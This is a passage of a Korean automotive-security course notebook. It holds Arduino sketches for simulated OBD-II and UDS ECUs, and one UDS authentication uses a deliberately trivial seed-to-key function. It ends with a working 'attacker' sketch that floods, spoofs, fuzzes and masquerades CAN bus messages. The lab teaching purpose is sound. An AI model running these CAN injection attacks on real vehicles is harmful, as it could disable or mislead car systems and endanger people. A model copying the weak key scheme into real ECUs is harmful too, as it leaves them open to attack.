        "    unsigned char buf[8];\n",
        "    CAN.readMsgBuf(&len, buf);\n",
        "    unsigned long canId = CAN.getCanId();\n",
        "\n",
        "    // 수신 로그 출력\n",
        "    Serial.print(\"수신 ID: 0x\");\n",
        "    Serial.print(canId, HEX);\n",
        "    Serial.print(\" | Data: \");\n",
        "    for (int i = 0; i < len; i++) {\n",
        "      if (buf[i] < 0x10) Serial.print(\"0\");\n",
        "      Serial.print(buf[i], HEX);\n",
        "      Serial.print(\" \");\n",
        "    }\n",
        "    Serial.println();\n",
        "\n",
        "    // 0x7DF → 01 05 요청이면 온도 응답\n",
        "    if (canId == 0x7DF && buf[1] == 0x01 && buf[2] == 0x05) {\n",
        "      unsigned char raw_temp = random(60, 100);  // A = 온도 + 40\n",
        "      unsigned char response[8] = {0x03, 0x41, 0x05, raw_temp, 0, 0, 0, 0};\n",
        "      CAN.sendMsgBuf(0x7E8, 0, 8, response);\n",
        "\n",
        "      Serial.print(\"온도 응답 전송: \");\n",
        "      Serial.print(raw_temp - 40);\n",
        "      Serial.println(\" °C\");\n",
        "    }\n",
        "  }\n",
        "}\n"
      ],
      "metadata": {
        "id": "DnW5F4zecmxP"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "## 10. OBD2_ECU2\n",
        "이거 첫번째 코드 잘못된 코드고, 2번째 코드가 정상임"
      ],
      "metadata": {
        "id": "84lAjV0jxi3K"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "#include \"DFRobot_MCP2515.h\"\n",
        "\n",
        "const int SPI_CS_PIN = 10;\n",
        "DFRobot_MCP2515 CAN(SPI_CS_PIN);\n",
        "\n",
        "\n",
        "// 메시지 버퍼\n",
        "unsigned char data[8];\n",
        "\n",
        "void setup() {\n",
        "  Serial.begin(115200);\n",
        "  randomSeed(analogRead(0));\n",
        "\n",
        "  while (CAN.begin(CAN_500KBPS)) {\n",
        "    Serial.println(\"CAN 버스 초괴화 실패\");\n",
        "    delay(3000);\n",
        "  }\n",
        "  Serial.println(\"CAN 버스 초괴화 성공\");\n",
        "}\n",
        "\n",
        "void loop() {\n",
        "  // 메시지 0x100 (100ms)\n",
        "  for (int i = 0; i < 8; i++) data[i] = random(0, 256);\n",
        "  CAN.sendMsgBuf(0x100, 0, 8, data);\n",
        "  delay(100);\n",
        "\n",
        "  // 메시지 0x120 (100ms)\n",
        "  for (int i = 0; i < 8; i++) data[i] = random(0, 256);\n",
        "  CAN.sendMsgBuf(0x120, 0, 8, data);\n",
        "  delay(100);\n",
        "\n",
        "  // 메시지 0x220 (200ms)\n",
        "  for (int i = 0; i < 8; i++) data[i] = random(0, 256);\n",
        "  CAN.sendMsgBuf(0x220, 0, 8, data);\n",
        "  delay(200);\n",
        "\n",
        "  // 메시지 0x700 (700ms)\n",
        "  for (int i = 0; i < 8; i++) data[i] = random(0, 256);\n",
        "  CAN.sendMsgBuf(0x700, 0, 8, data);\n",
        "  delay(700);\n",
        "\n",
        "  // 메시지 0x200 (200ms)\n",
        "  for (int i = 0; i < 8; i++) data[i] = random(0, 256);\n",
        "  CAN.sendMsgBuf(0x200, 0, 8, data);\n",
        "  delay(200);\n",
        "\n",
        "  // 수신 처리 (OBD 요청 응답)\n",
        "  if (CAN.checkReceive() == CAN_MSGAVAIL) {\n",
        "    unsigned char len = 0;\n",
        "    unsigned char buf[8];\n",
        "    CAN.readMsgBuf(&len, buf);\n",
        "    unsigned long canId = CAN.getCanId();\n",
        "\n",
        "    Serial.print(\"ID: 0x\");\n",
        "    Serial.print(canId, HEX);\n",
        "    Serial.print(\" | DLC: \");\n",
        "    Serial.print(len);\n",
        "    Serial.print(\" | Data: \");\n",
        "    for (int i = 0; i < len; i++) {\n",
        "      Serial.print(buf[i], HEX);\n",
        "      Serial.print(\" \");\n",
        "    }\n",
        "    Serial.println();\n",
        "\n",
        "    // 속도 요청 (01 0D)\n",
        "    if (canId == 0x7DF && buf[1] == 0x01 && buf[2] == 0x0D) {\n",
        "      unsigned char speed = random(0, 256);  // 요청에 맞는 speed 값 생성\n",
        "      unsigned char response[8] = { 0x03, 0x41, 0x0D, speed, 0, 0, 0, 0 };\n",
        "      CAN.sendMsgBuf(0x7E9, 0, 8, response);\n",
        "      Serial.print(\"Responded with Speed: \");\n",
        "      Serial.println(speed);\n",
        "    }\n",
        "\n",
        "    // RPM 요청 (01 0C)\n",
        "    else if (buf[1] == 0x01 && buf[2] == 0x0C) {\n",
        "      unsigned int rpm = random(0, 8000);  // 실제 RPM 값 생성\n",
        "      unsigned int raw_value = rpm * 4;    // 전송 값 계산 (A*256 + B)\n",
        "\n",
        "      unsigned char A = (raw_value >> 8) & 0xFF;\n",
        "      unsigned char B = raw_value & 0xFF;\n",
        "\n",
        "      unsigned char response[8] = { 0x04, 0x41, 0x0C, A, B, 0x00, 0x00, 0x00 };\n",
        "      CAN.sendMsgBuf(0x7E9, 0, 8, response);\n",
        "\n",
        "      Serial.print(\"RPM request received. Responding with: \");\n",
        "      Serial.println(rpm);\n",
        "    }\n",
        "  }\n",
        "}\n"
      ],
      "metadata": {
        "id": "k0UrM5IFTx6p"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "## 10.OBD2_ECU3\n",
        "\n",
        "이거 첫번째 코드 잘못된 코드고, 2번째 코드가 정상임"
      ],
      "metadata": {
        "id": "E7lD9or_xmdm"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "#include \"DFRobot_MCP2515.h\"\n",
        "#include <Wire.h>\n",
        "#include <LiquidCrystal_I2C.h>\n",
        "\n",
        "const int SPI_CS_PIN = 10;\n",
        "DFRobot_MCP2515 CAN(SPI_CS_PIN);\n",
        "LiquidCrystal_I2C lcd(0x27, 16, 2);  // I2C LCD 16x2\n",
        "\n",
        "int temperature = 0;\n",
        "int speed = 0;\n",
        "int rpm = 0;\n",
        "\n",
        "void setup() {\n",
        "  Serial.begin(115200);\n",
        "\n",
        "  while (CAN.begin(CAN_500KBPS)) {\n",
        "    Serial.println(\"CAN 초기화 실패\");\n",
        "    delay(3000);\n",
        "  }\n",
        "\n",
        "  Serial.println(\"TOOL 시작 - 시리얼 명령을 입력하세요:\");\n",
        "  Serial.println(\"예: 7DF0201050000000000\");\n",
        "\n",
        "  lcd.init();\n",
        "  lcd.backlight();\n",
        "  lcd.setCursor(0, 0);\n",
        "  lcd.print(\"OBD-II TOOL Ready\");\n",
        "  delay(1000);\n",
        "  lcd.clear();\n",
        "}\n",
        "\n",
        "void loop() {\n",
        "  // ▶ 명령 입력 처리\n",
        "  if (Serial.available()) {\n",
        "    String input = Serial.readStringUntil('\\n');\n",
        "    input.trim(); // 개행 제거\n",
        "\n",
        "    unsigned char data[8];\n",
        "\n",
        "    if (input == \"7DF0201050000000000\") {\n",
        "      // 온도 요청\n",
        "      data[0] = 0x02; data[1] = 0x01; data[2] = 0x05;\n",
        "      for (int i = 3; i < 8; i++) data[i] = 0;\n",
        "      CAN.sendMsgBuf(0x7DF, 0, 8, data);\n",
        "      Serial.println(\"→ 온도 요청 전송\");\n",
        "\n",
        "    } else if (input == \"7DF02010D0000000000\") {\n",
        "      // 속도 요청\n",
        "      data[0] = 0x02; data[1] = 0x01; data[2] = 0x0D;\n",
        "      for (int i = 3; i < 8; i++) data[i] = 0;\n",
        "      CAN.sendMsgBuf(0x7DF, 0, 8, data);\n",
        "      Serial.println(\"→ 속도 요청 전송\");\n",
        "\n",
        "    } else if (input == \"7DF02010C0000000000\") {\n",
        "      // RPM 요청\n",
        "      data[0] = 0x02; data[1] = 0x01; data[2] = 0x0C;\n",
        "      for (int i = 3; i < 8; i++) data[i] = 0;\n",
        "      CAN.sendMsgBuf(0x7DF, 0, 8, data);\n",
        "      Serial.println(\"→ RPM 요청 전송\");\n",
        "\n",
        "    } else {\n",
        "      Serial.println(\"알 수 없는 명령입니다.\");\n",
        "    }\n",
        "\n",
        "    delay(200);  // ECU 응답 대기\n",
        "  }\n",
        "\n",
        "  // ▶ 응답 수신 처리\n",
        "  if (CAN.checkReceive() == CAN_MSGAVAIL) {\n",
        "    unsigned char len = 0;\n",
        "    unsigned char buf[8];\n",
        "    CAN.readMsgBuf(&len, buf);\n",
        "    unsigned long canId = CAN.getCanId();\n",
        "\n",
        "    // 로그 출력\n",
        "    Serial.print(\"← 응답 수신: ID=0x\");\n",
        "    Serial.print(canId, HEX);\n",
        "    Serial.print(\" Data: \");\n",
        "    for (int i = 0; i < len; i++) {\n",
        "      Serial.print(buf[i], HEX);\n",
        "      Serial.print(\" \");\n",
        "    }\n",
        "    Serial.println();\n",
        "\n",
        "    // ▶ 응답 해석 및 LCD 출력\n",
        "    if (canId == 0x7E8 && buf[1] == 0x41 && buf[2] == 0x05) {\n",
        "      temperature = buf[3] - 40;\n",
        "      lcd.setCursor(0, 0);\n",
        "      lcd.print(\"T:\");\n",
        "      lcd.print(temperature);\n",
        "      lcd.print(\"C   \");\n",
        "\n",
        "    } else if (canId == 0x7E9 && buf[1] == 0x41 && buf[2] == 0x0D) {\n",
        "      speed = buf[3];\n",
        "      lcd.setCursor(0, 1);\n",
        "      lcd.print(\"S:\");\n",
        "      lcd.print(speed);\n",
        "      lcd.print(\"km/h \");\n",
        "\n",
        "    } else if (canId == 0x7E9 && buf[1] == 0x41 && buf[2] == 0x0C) {\n",
        "      rpm = (buf[3] << 8 | buf[4]) / 4;\n",
        "      lcd.setCursor(8, 1);\n",
        "      lcd.print(\"R:\");\n",
        "      lcd.print(rpm);\n",
        "      lcd.print(\"rpm \");\n",
        "    }\n",
        "  }\n",
        "}\n"
      ],
      "metadata": {
        "id": "BR0uIyG_Sqs7"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "# 11.UDS"
      ],
      "metadata": {
        "id": "k2QgWmwEmn_G"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## 11. UDS_ECU"
      ],
      "metadata": {
        "id": "te6gaJIixpev"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "#include \"DFRobot_MCP2515.h\"\n",
        "const int SPI_CS_PIN = 10;\n",
        "DFRobot_MCP2515 CAN(SPI_CS_PIN);\n",
        "uint16_t lastSeed = 0;\n",
        "\n",
        "uint16_t generateKey(uint16_t seed) {\n",
        "    return (seed << 3);\n",
        "}\n",
        "\n",
        "// 데이터 버퍼\n",
        "unsigned char data_0x110[8];\n",
        "unsigned char data_0x210[8];\n",
        "unsigned char data_0x51[8];\n",
        "\n",
        "void setup() {\n",
        "  Serial.begin(115200);\n",
        "  randomSeed(analogRead(0));\n",
        "  while (CAN.begin(CAN_500KBPS)) {\n",
        "    Serial.println(\"CAN initialization failed\");\n",
        "    delay(1000);\n",
        "  }\n",
        "  Serial.println(\"CAN initialization successful (ECU)\");\n",
        "}\n",
        "\n",
        "void loop() {\n",
        "  // 일반 CAN 메시지 전송\n",
        "  // 0x110 메시지 전송\n",
        "  for (int i = 0; i < 8; i++) data_0x110[i] = random(0, 256);\n",
        "  CAN.sendMsgBuf(0x110, 0, 8, data_0x110);\n",
        "  delay(100);\n",
        "\n",
        "  // 0x210 메시지 전송\n",
        "  for (int i = 0; i < 8; i++) data_0x210[i] = random(0, 256);\n",
        "  CAN.sendMsgBuf(0x210, 0, 8, data_0x210);\n",
        "  delay(200);\n",
        "\n",
        "  // 0x51 메시지 전송\n",
        "  for (int i = 0; i < 8; i++) data_0x51[i] = random(0, 256);\n",
        "  CAN.sendMsgBuf(0x51, 0, 8, data_0x51);\n",
        "  delay(50);\n",
        "\n",
        "  // CAN 메시지 수신 및 처리\n",
        "  if (CAN.checkReceive() == CAN_MSGAVAIL) {\n",
        "    unsigned char len, buf[8];\n",
        "    CAN.readMsgBuf(&len, buf);\n",
        "    unsigned long id = CAN.getCanId();\n",
        "\n",
        "    // 시드 요청 처리 (0x27, 0x01)\n",
        "    if (id == 0x7E0 && buf[1] == 0x27 && buf[2] == 0x01) {\n",
        "      // 시드 생성 및 응답\n",
        "      lastSeed = random(0x1000, 0xFFFF);\n",
        "      Serial.print(\"Generated Seed: 0x\");\n",
        "      Serial.println(lastSeed, HEX);\n",
        "\n",
        "      unsigned char resSeed[8] = {\n",
        "        0x04, 0x67, 0x01, (uint8_t)(lastSeed >> 8), (uint8_t)(lastSeed & 0xFF), 0, 0, 0\n",
        "      };\n",
        "      CAN.sendMsgBuf(0x7E8, 0, 8, resSeed);\n",
        "      Serial.println(\"Sent Seed response\");\n",
        "    }\n",
        "    // 키 검증 처리 (0x27, 0x02)\n",
        "    else if (id == 0x7E0 && buf[1] == 0x27 && buf[2] == 0x02) {\n",
        "      uint16_t receivedKey = (buf[3] << 8) | buf[4];\n",
        "      uint16_t expectedKey = generateKey(lastSeed);\n",
        "\n",
        "      Serial.print(\"Received Key: 0x\");\n",
        "      Serial.println(receivedKey, HEX);\n",
        "      Serial.print(\"Expected Key: 0x\");\n",
        "      Serial.println(expectedKey, HEX);\n",
        "\n",
        "      // 키 검증 및 응답\n",
        "      if (receivedKey == expectedKey) {\n",
        "        unsigned char positiveRes[8] = {0x02, 0x67, 0x02, 0, 0, 0, 0, 0};\n",
        "        CAN.sendMsgBuf(0x7E8, 0, 8, positiveRes);\n",
        "        Serial.println(\"Authentication successful! (Key matched)\");\n",
        "      } else {\n",
        "        unsigned char negativeRes[8] = {0x03, 0x7F, 0x27, 0x35, 0, 0, 0, 0}; // NRC 0x35 (Invalid Key)\n",
        "        CAN.sendMsgBuf(0x7E8, 0, 8, negativeRes);\n",
        "        Serial.println(\"Authentication failed! (Key mismatch)\");\n",
        "      }\n",
        "    }\n",
        "  }\n",
        "}"
      ],
      "metadata": {
        "id": "Cbf1I0Y9dDNA",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 110
        },
        "outputId": "ad41b267-6dc5-4b89-b7cf-3ce26c79ca0d"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "error",
          "ename": "SyntaxError",
          "evalue": "invalid syntax (<ipython-input-1-0e8c874525da>, line 4)",
          "traceback": [
            "\u001b[0;36m  File \u001b[0;32m\"<ipython-input-1-0e8c874525da>\"\u001b[0;36m, line \u001b[0;32m4\u001b[0m\n\u001b[0;31m    const int SPI_CS_PIN = 10;\u001b[0m\n\u001b[0m          ^\u001b[0m\n\u001b[0;31mSyntaxError\u001b[0m\u001b[0;31m:\u001b[0m invalid syntax\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "## 11. UDS_Tester\n"
      ],
      "metadata": {
        "id": "-NDCip8cxtBd"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "#include \"DFRobot_MCP2515.h\"\n",
        "const int SPI_CS_PIN = 10;\n",
        "DFRobot_MCP2515 CAN(SPI_CS_PIN);\n",
        "uint16_t savedKey = 0; // 생성된 키를 저장할 변수\n",
        "bool waitingForSeed = false; // 시드 응답 대기 상태 플래그\n",
        "\n",
        "uint16_t generateKey(uint16_t seed) {\n",
        "    return (seed << 3);\n",
        "}\n",
        "\n",
        "void setup() {\n",
        "  Serial.begin(115200);\n",
        "  while (CAN.begin(CAN_500KBPS)) {\n",
        "    Serial.println(\"CAN initialization failed\");\n",
        "    delay(1000);\n",
        "  }\n",
        "  Serial.println(\"CAN initialization successful (Tester)\");\n",
        "  Serial.println(\"Enter CAN frame (ex.7E00227010000000000)\");\n",
        "}\n",
        "\n",
        "void loop() {\n",
        "  if (Serial.available()) {\n",
        "    // 입력 받기\n",
        "    String input = Serial.readStringUntil('\\n');\n",
        "\n",
        "    if (input == \"7E00227010000000000\") {\n",
        "      // 시드 요청 메시지 전송\n",
        "      unsigned char requestSeed[8] = {\n",
        "        0x02, 0x27, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00\n",
        "      };\n",
        "      CAN.sendMsgBuf(0x7E0, 0, 8, requestSeed);\n",
        "      Serial.println(\"Sent seed request\");\n",
        "      waitingForSeed = true; // 시드 응답 대기 상태로 설정\n",
        "    }\n",
        "  }\n",
        "\n",
        "  if (CAN.checkReceive() == CAN_MSGAVAIL) {\n",
        "    unsigned char len, buf[8];\n",
        "    CAN.readMsgBuf(&len, buf);\n",
        "    unsigned long id = CAN.getCanId();\n",
        "\n",
        "    if (id == 0x7E8 && buf[1] == 0x67 && buf[2] == 0x01 && waitingForSeed) {\n",
        "      uint16_t seed = (buf[3] << 8) | buf[4];\n",
        "      Serial.println(\"Received Seed\");\n",
        "\n",
        "      // 키 생성 및 저장\n",
        "      savedKey = generateKey(seed);\n",
        "      Serial.println(\"Generated Key\");\n",
        "\n",
        "      // 시드 받은 후 자동으로 키 전송\n",
        "      delay(100); // 약간의 지연 추가\n",
        "\n",
        "      // 키 전송 메시지\n",
        "      unsigned char sendKey[8] = {\n",
        "        0x04, 0x27, 0x02, (uint8_t)(savedKey >> 8), (uint8_t)(savedKey & 0xFF), 0, 0, 0\n",
        "      };\n",
        "      CAN.sendMsgBuf(0x7E0, 0, 8, sendKey);\n",
        "      Serial.println(\"Sent Key automatically\");\n",
        "\n",
        "      // 디버그 정보 출력\n",
        "      Serial.print(\"Key value: 0x\");\n",
        "      Serial.println(savedKey, HEX);\n",
        "\n",
        "      waitingForSeed = false; // 플래그 초기화\n",
        "    }\n",
        "    else if (id == 0x7E8 && buf[1] == 0x67 && buf[2] == 0x02) {\n",
        "      Serial.println(\"Authentication successful\");\n",
        "    }\n",
        "    else if (id == 0x7E8 && buf[1] == 0x7F && buf[2] == 0x27) {\n",
        "      Serial.println(\"Authentication failed\");\n",
        "    }\n",
        "  }\n",
        "}"
      ],
      "metadata": {
        "id": "h1EN8z9qdGTk",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 109
        },
        "outputId": "b8249a20-69b7-4b34-c451-951d065f329e"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "error",
          "ename": "SyntaxError",
          "evalue": "invalid syntax (<ipython-input-2-0ec7b8021e28>, line 2)",
          "traceback": [
            "\u001b[0;36m  File \u001b[0;32m\"<ipython-input-2-0ec7b8021e28>\"\u001b[0;36m, line \u001b[0;32m2\u001b[0m\n\u001b[0;31m    const int SPI_CS_PIN = 10;\u001b[0m\n\u001b[0m          ^\u001b[0m\n\u001b[0;31mSyntaxError\u001b[0m\u001b[0;31m:\u001b[0m invalid syntax\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# 스마트 자동차 2일차 코드"
      ],
      "metadata": {
        "id": "H7E10hFdsKQ6"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "//CAN통신공격실습_ECU1\n",
        "#include \"DFRobot_MCP2515.h\"\n",
        "\n",
        "const int SPI_CS_PIN = 10;\n",
        "DFRobot_MCP2515 CAN(SPI_CS_PIN);\n",
        "\n",
        "unsigned long lastSendTime_110 = 0;\n",
        "unsigned long lastSendTime_210 = 0;\n",
        "unsigned long lastSendTime_051 = 0;\n",
        "unsigned long lastSendTime_200 = 0;\n",
        "\n",
        "void setup() {\n",
        "  Serial.begin(115200);\n",
        "  while (CAN.begin(CAN_500KBPS)) {\n",
        "    Serial.println(\"CAN 초기화 실패\");\n",
        "    delay(3000);\n",
        "  }\n",
        "\n",
        "  Serial.println(\"ECU 1번 시작됨\");\n",
        "}\n",
        "\n",
        "void loop() {\n",
        "  unsigned long now = millis();\n",
        "\n",
        "  if (now - lastSendTime_110 >= 100) {\n",
        "    sendMessage(0x110);\n",
        "    lastSendTime_110 = now;\n",
        "  }\n",
        "  if (now - lastSendTime_210 >= 200) {\n",
        "    sendMessage(0x210);\n",
        "    lastSendTime_210 = now;\n",
        "  }\n",
        "  if (now - lastSendTime_051 >= 50) {\n",
        "    sendMessage(0x051);\n",
        "    lastSendTime_051 = now;\n",
        "  }\n",
        "  if (now - lastSendTime_200 >= 200) {\n",
        "    sendMessage(0x200);\n",
        "    lastSendTime_200 = now;\n",
        "  }\n",
        "}\n",
        "\n",
        "void sendMessage(unsigned int id) {\n",
        "  unsigned char data[8];\n",
        "  for (int i = 0; i < 8; i++) data[i] = random(0, 256);\n",
        "  CAN.sendMsgBuf(id, 0, 8, data);\n",
        "  Serial.print(\"전송: ID=0x\");\n",
        "  Serial.println(id, HEX);\n",
        "}\n"
      ],
      "metadata": {
        "id": "AV9oQ3MwtS6c"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "//CAN통신공격실습_ECU2\n",
        "#include \"DFRobot_MCP2515.h\"\n",
        "\n",
        "const int SPI_CS_PIN = 10;\n",
        "DFRobot_MCP2515 CAN(SPI_CS_PIN);\n",
        "\n",
        "unsigned long lastSendTime_100 = 0;\n",
        "unsigned long lastSendTime_120 = 0;\n",
        "unsigned long lastSendTime_220 = 0;\n",
        "unsigned long lastSendTime_1000 = 0;\n",
        "\n",
        "void setup() {\n",
        "  Serial.begin(115200);\n",
        "  while (CAN.begin(CAN_500KBPS)) {\n",
        "    Serial.println(\"CAN 초기화 실패\");\n",
        "    delay(3000);\n",
        "  }\n",
        "\n",
        "  Serial.println(\"ECU 2번 시작됨\");\n",
        "}\n",
        "\n",
        "void loop() {\n",
        "  unsigned long now = millis();\n",
        "\n",
        "  if (now - lastSendTime_100 >= 100) {\n",
        "    sendMessage(0x100);\n",
        "    lastSendTime_100 = now;\n",
        "  }\n",
        "  if (now - lastSendTime_120 >= 100) {\n",
        "    sendMessage(0x120);\n",
        "    lastSendTime_120 = now;\n",
        "  }\n",
        "  if (now - lastSendTime_220 >= 200) {\n",
        "    sendMessage(0x220);\n",
        "    lastSendTime_220 = now;\n",
        "  }\n",
        "  if (now - lastSendTime_1000 >= 1000) {\n",
        "    sendMessage(0x1000);\n",
        "    lastSendTime_1000 = now;\n",
        "  }\n",
        "}\n",
        "\n",
        "void sendMessage(unsigned int id) {\n",
        "  unsigned char data[8];\n",
        "  for (int i = 0; i < 8; i++) data[i] = random(0, 256);\n",
        "  CAN.sendMsgBuf(id, 0, 8, data);\n",
        "  Serial.print(\"전송: ID=0x\");\n",
        "  Serial.println(id, HEX);\n",
        "}"
      ],
      "metadata": {
        "id": "X2sa1t3ktVWo"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "3. ATTACker"
      ],
      "metadata": {
        "id": "fDzNbGBDsOal"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "//CAN통신공격실습_ATTACKER\n",
        "#include \"DFRobot_MCP2515.h\"\n",
        "\n",
        "const int SPI_CS_PIN = 10;\n",
        "DFRobot_MCP2515 CAN(SPI_CS_PIN);\n",
        "\n",
        "void setup() {\n",
        "  Serial.begin(115200);\n",
        "  while (CAN.begin(CAN_500KBPS)) {\n",
        "    Serial.println(\"CAN 초기화 실패\");\n",
        "    delay(3000);\n",
        "  }\n",
        "\n",
        "  Serial.println(\"Attacker 보드 시작됨\");\n",
        "  Serial.println(\"공격 모드 선택: \");\n",
        "  Serial.println(\"1: DoS\");\n",
        "  Serial.println(\"2: Spoofing\");\n",
        "  Serial.println(\"3: Fuzzing\");\n",
        "  Serial.println(\"4: Masquerade\");\n",
        "}\n",
        "\n",
        "void loop() {\n",
        "  if (Serial.available()) {\n",
        "    char input = Serial.read();\n",
        "\n",
        "    if (input == '1') dosAttack();\n",
        "    else if (input == '2') spoofingAttack();\n",
        "    else if (input == '3') fuzzingAttack();\n",
        "    else if (input == '4') masqueradeAttack();\n",
        "    else Serial.println(\"잘못된 입력입니다. 1~4 중에서 선택하세요.\");\n",
        "  }\n",
        "}\n",
        "\n",
        "// 1. DoS 공격: 우선순위 가장 높은 ID(0x000) 반복 전송\n",
        "void dosAttack() {\n",
        "  Serial.println(\"DoS 공격 시작\");\n",
        "\n",
        "  for (int i = 0; i < 300; i++) {\n",
        "    unsigned char data[8];\n",
        "    for (int j = 0; j < 8; j++) data[j] = random(0, 256);\n",
        "    CAN.sendMsgBuf(0x000, 0, 8, data);\n",
        "\n",
        "    Serial.println(\"DoS 전송 ID: 0x000\");\n",
        "  }\n",
        "\n",
        "  Serial.println(\"DoS 공격 종료\");\n",
        "}\n",
        "\n",
        "// 2. Spoofing 공격: ECU ID를 위조한 반복 전송\n",
        "void spoofingAttack() {\n",
        "  Serial.println(\"Spoofing 공격 시작\");\n",
        "\n",
        "  for (int i = 0; i < 30; i++) {\n",
        "    unsigned char spoofData[8] = {0xAA, 0xBB, 0xCC, 0xDD, 0x01, 0x02, 0x03, 0x04};\n",
        "    CAN.sendMsgBuf(0x100, 0, 8, spoofData);  // ECU2 ID spoof\n",
        "    Serial.println(\"Spoofing 전송 ID: 0x100\");\n",
        "    delay(100);\n",
        "  }\n",
        "\n",
        "  Serial.println(\"Spoofing 공격 종료\");\n",
        "}\n",
        "\n",
        "// 3. Fuzzing 공격: 무작위 ID, 무작위 데이터 대량 전송\n",
        "void fuzzingAttack() {\n",
        "  Serial.println(\"Fuzzing 공격 시작\");\n",
        "\n",
        "  for (int i = 0; i < 300; i++) {\n",
        "    unsigned int id = random(0x000, 0x7FF + 1);\n",
        "    unsigned char data[8];\n",
        "    for (int j = 0; j < 8; j++) data[j] = random(0, 256);\n",
        "    CAN.sendMsgBuf(id, 0, 8, data);\n",
        "\n",
        "    Serial.print(\"Fuzzing 전송 ID: 0x\");\n",
        "    Serial.println(id, HEX);\n",
        "    delay(10);\n",
        "  }\n",
        "\n",
        "  Serial.println(\"Fuzzing 공격 종료\");\n",
        "}\n",
        "\n",
        "// 4. Masquerade 공격: 정상 ECU ID로 위장하여 메시지 전송\n",
        "void masqueradeAttack() {\n",
        "  Serial.println(\"Masquerade 공격 시작\");\n",
        "\n",
        "  for (int i = 0; i < 30; i++) {\n",
        "    sendFakeMessage(0x110);\n",
        "    delay(50);\n",
        "    sendFakeMessage(0x210);\n",
        "    delay(50);\n",
        "    sendFakeMessage(0x51);\n",
        "    delay(50);\n",
        "  }\n",
        "\n",
        "  Serial.println(\"Masquerade 공격 종료\");\n",
        "}\n",
        "\n",
        "void sendFakeMessage(unsigned int fakeId) {\n",
        "  unsigned char data[8];\n",
        "  for (int i = 0; i < 8; i++) data[i] = random(0, 256);\n",
        "  CAN.sendMsgBuf(fakeId, 0, 8, data);\n",
        "  Serial.print(\"Masquerade 전송 ID: 0x\");\n",
        "  Serial.println(fakeId, HEX);\n",
        "}"
      ],
      "metadata": {
        "id": "r-5Mq3yFq23O"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [],
      "metadata": {
        "id": "okpw2KWttQg5"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [],
      "metadata": {
        "id": "8-kyRnH8sSd_"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}